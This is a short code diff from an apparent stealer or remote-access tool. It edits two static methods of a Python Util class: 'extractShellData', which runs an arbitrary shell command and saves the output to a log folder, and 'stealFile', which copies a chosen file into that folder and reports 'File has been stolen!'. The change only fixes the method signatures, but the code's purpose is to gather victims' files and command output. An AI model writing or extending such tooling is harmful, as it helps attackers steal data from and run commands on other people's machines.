@@ -33,18 +33,18 @@ class Util:
 
 
     @staticmethod
-    def extractShellData(self, shellCommand:str):
+    def extractShellData(logPath, shellCommand:str):
         if shellCommand:
             result = Util.executeShellCommand(shellCommand)
-            Util.fileOut(self.__config.logPath + 'shell.txt', result, 'w')
+            Util.fileOut(logPath + 'shell.txt', result, 'w')
             print('Shell command executed!')
 
 
 
     @staticmethod
-    def stealFile(self, stealPath:str):
+    def stealFile(logPath, stealPath:str):
         if stealPath:
             filename = stealPath.split('\\')[-1]
-            copy(stealPath, self.__config.logPath + filename)
+            copy(stealPath, logPath + filename)
             print('File has been stolen!')
 
